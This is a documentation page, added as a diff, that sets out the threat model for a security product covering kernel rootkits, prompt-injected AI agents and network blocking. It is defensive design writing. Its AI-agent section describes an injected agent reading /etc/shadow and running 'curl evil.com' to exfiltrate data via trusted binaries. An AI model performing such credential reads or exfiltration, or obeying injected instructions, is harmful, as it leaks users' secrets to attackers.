@@ -1,0 +1,59 @@
+---
+title: "Threat Model"
+description: "Three simultaneous threat classes addressed by the Sentinel Stack: Kernel Compromise, AI Agent Exfiltration, and Wire-Speed Network Threats."
+view: architect
+order: 2
+---
+
+# Threat Model
+
+The Sentinel Stack addresses three distinct threat classes simultaneously. Each class requires enforcement at a different hardware privilege level, which is why the stack spans from Ring -1 to the physical NIC.
+
+---
+
+## Threat Class 1: Kernel Compromise (Ring 0)
+
+Traditional eBPF/LSM security tools run inside the kernel. If a rootkit compromises the kernel, these tools become untrustworthy. The attacker can modify `sys_call_table`, patch function pointers, or disable security hooks entirely.
+
+**Sentinel VMI eliminates this vector** by operating from Ring -1 — the hypervisor layer. The hypervisor marks the kernel's `sys_call_table` as read-only using **Nested Page Tables (NPT)**. Any attempt to modify it triggers a hardware `#NPF` fault that the hypervisor intercepts.
+
+- The rootkit's PID is identified via `task_struct` walking
+- The PID is pushed to `vmi_alert_map` for cross-layer propagation
+- Hyperion XDP drops all network traffic from the compromised PID at wire-speed
+- Telos Runtime elevates taint to `TAINT_CRITICAL` and triggers Network Slam
+
+> The feedback loop for Ring -1 errors is a kernel panic and hard reboot — no error messages, no debugger. This is by design: the enforcement is below the attacker's reach.
+
+---
+
+## Threat Class 2: The Great Exfiltration (AI Agent Compromise)
+
+When an autonomous AI agent is subjected to a malicious prompt injection, it rarely downloads a traditional rootkit. Instead, it leverages **standard, cryptographically signed system binaries** — `curl`, `wget`, `base64` — to exfiltrate sensitive data. These are "Living Off the Land Binaries" (LOLBins).
+
+Standard telemetry cannot distinguish this from legitimate system administration. Docker containers cannot prevent it because `curl` is a trusted binary.
+
+**Telos Runtime solves this** with kernel-level Information Flow Control (IFC):
+
+1. Agent reads `/etc/shadow` — eBPF elevates taint to `CRITICAL`
+2. Agent tries `curl evil.com` — **Network Slam** kills the connection with `-EPERM`
+3. The taint is **irreversible** for the lifetime of the process
+4. Data never leaves the machine
+
+The Dual-Gate Architecture enforces:
+- **Execution Gate** (`lsm/bprm_check_security`): Only explicitly declared binaries are allowed
+- **Network Gate** (`lsm/socket_connect`): Network access is denied for tainted processes
+
+---
+
+## Threat Class 3: Network-Level Threats (Wire Speed)
+
+Malicious domains are resolved to IP addresses by the Telos Domain Intelligence engine (L0-L4 classification pipeline). These IPs are pushed to the Hyperion XDP blacklist via HTTP RPC.
+
+**Hyperion XDP drops packets at the NIC driver** — before `sk_buff` allocation, before the Linux network stack processes them:
+
+- **Latency:** Sub-microsecond enforcement
+- **Throughput:** Wire-speed with zero kernel network stack involvement
+- **Lookup:** O(1) deterministic hash table
+- **Eviction:** Automatic LRU purging under high loads
+
+> When Hyperion is attached to a physical NIC, XDP drops are irreversible at the hardware level. Blacklisted IPs experience 100% packet loss.
